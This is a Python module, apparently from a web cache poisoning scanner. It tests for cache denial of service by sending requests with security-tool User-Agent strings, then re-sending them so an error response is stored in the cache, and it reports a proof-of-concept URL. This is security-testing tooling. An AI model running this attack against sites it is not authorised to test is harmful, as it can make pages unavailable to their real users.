from copy import deepcopy
from modules.base import AttackModule
from core.cache import extract_cache_headers
import core.config

class UserAgentAttack(AttackModule):

    name = "Cache DoS via Malicious User-Agent"

    UAS = [
        "sqlmap/1.6.6.7#dev (https://sqlmap.org)",
        "WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)",
        "feroxbuster/2.7.0",
        "masscan/1.3",
        "Fuzz Faster U Fool v1.4.0",
        "gobuster/3.1.0"
    ]

    def run(self, ctx):
        ctx.log.debug(f"Testing for {self.name}")

        for ua in self.UAS:
            headers = deepcopy(ctx.headers)
            headers["User-Agent"] = ua

            # Sending request(s) with no random user-agent [last argument set to False]
            resp, cb = ctx.req.send(ctx.method, ctx.url, headers, ctx.body, False)

            if resp is None:
                return

            if resp.status_code == 403 or len(resp.text) != len(ctx.base_resp.text):
                cache = extract_cache_headers(resp)
                if cache is not None:
                    # Send the same request one more time to save the cache
                    _, _ = ctx.req.send(ctx.method, ctx.url, headers, ctx.body, False, cb)
                    ctx.log.vuln(f"User Agent that triggered 403: {ua} | Exploit PoC: {ctx.url}?{cb}")

                    if core.config.open_browser:
                        import webbrowser
                        webbrowser.open_new_tab(f"{ctx.url}?{cb}")

        ctx.log.error("Not vulnerable")